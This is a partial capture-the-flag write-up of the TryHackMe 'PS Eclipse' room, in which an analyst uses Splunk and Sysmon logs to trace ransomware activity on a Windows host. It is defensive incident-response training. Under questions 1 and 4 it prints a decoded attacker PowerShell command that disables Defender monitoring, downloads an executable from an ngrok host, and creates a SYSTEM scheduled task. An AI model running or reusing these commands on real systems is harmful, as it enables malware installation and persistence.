# PS Eclipse
Use Splunk to investigate the ransomware activity.

[TryHackMe Room](https://tryhackme.com/room/posheclipse)

## Introduction
You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called **TryNotHackMe**.

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan's machine on **Monday, May 16th, 2022**. The client noted that **the machine** is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device.

Your manager has tasked you to check the events in Splunk to determine what occurred in Keegan's device. 

Happy Hunting!

## Tools Used
- dCode
- Splunk
- VirusTotal

---
---

## Answer the questions below
### 1. A suspicious binary was downloaded to the endpoint. What was the name of the binary?
To filter out the logs, the initial search query was `index=main ComputerName=DESKTOP-TBV8NEF sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`.

Next, the `TargetFilename` field was investigated to determine the suspicious binary.

One of the files that stood out was `OUTSTANDING_GUTTER.exe` as the file name is unusual and it's saved in the `C:\Windows\Temp\` directory, one of the common staging areas that attackers use.

However to further verify that this was the suspicious file, the process creation event from the file creation alert of the binary was investigated. To find this in the logs, the search query was `index=main ComputerName=DESKTOP-TBV8NEF sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational ProcessGuid: {eea302a0-51cb-6282-d00e-000000000300} ProcessId: 10224  Description="Windows PowerShell"`

An encoded PowerShell command was discovered. With the help of dCode, the command was decoded as `Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"`.

These evidences prove that <mark>`OUTSTANDING_GUTTER.exe`</mark> was the suspicious binary.

What makes this more suspicious is that it disables the real-time monitoring of Microsoft Defender. Moreover it must be noted that the binary was also used in a scheduled task.

### 2. What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.

<details>
<summary>💡 Hint</summary>

```
CyberChef can help with defanging the URL.
```

</details>

Based from the decoded PowerShell command, the binary was downloaded from <mark>`hxxp[://]886e-181-215-214-32[.]ngrok[.]io`</mark>.

### 3. What Windows executable was used to download the suspicious binary? Enter full path.

PowerShell was used for the download. The full path is <mark>`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`</mark>.

### 4. What command was executed to configure the suspicious binary to run with elevated privileges?

<details>
<summary>💡 Hint</summary>

```
Event Code 12 will help here. Note that the attacker tried multiple attempts to configure this command correctly.
```

</details>

In order to locate the command, `Sysmon Event ID 1` as well as `OUTSTANDING_GUTTER.exe` was appended in the search query.

The command for configuring the binary was <mark>`"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f`</mark>.

### 5. What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)

### 6. The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.

<details>
<summary>💡 Hint</summary>

```
CyberChef can help with defanging the URL.
```

</details>

### 7. A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?

### 8. The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?

<details>
<summary>💡 Hint</summary>

```
Check VirusTotal for the hash of the PowerShell script.
```

</details>

### 9. A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?

### 10. The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?

---
---

## References
